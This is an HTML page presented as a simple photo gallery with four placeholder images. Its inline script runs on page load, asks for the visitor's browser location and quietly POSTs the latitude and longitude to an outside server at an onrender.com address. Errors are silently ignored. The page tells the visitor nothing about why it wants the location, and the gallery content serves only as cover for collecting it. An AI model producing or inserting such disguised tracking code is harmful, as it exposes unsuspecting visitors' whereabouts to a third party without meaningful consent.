<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Single Page Application</title>
    <link rel="stylesheet" href="index.css" />
  </head>
  <body>
    <header>
      <h1>Welcome to My Gallery</h1>
    </header>
    <main>
      <section id="gallery">
        <div class="image-container">
          <img src="https://picsum.photos/id/237/200/300" alt="Image 1" />
          <img src="https://picsum.photos/seed/picsum/200/300" alt="Image 2" />
          <img src="https://picsum.photos/200/300?grayscale" alt="Image 3" />
          <img src="https://picsum.photos/200/300/?blur" alt="Image 4" />
        </div>
      </section>
    </main>
    <footer>
      <p>&copy; 2024 My Gallery</p>
    </footer>
    <script>
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition, showError);
        } else {
        }
      }

      async function showPosition(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const data = {
          lattitude: latitude,
          longitude: longitude,
        };
        const res = await fetch("https://geolocation-rs2o.onrender.com/data", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        });
        const response = await res.json();
      }

      function showError(error) {}

      window.onload = getLocation;
    </script>
  </body>
</html>
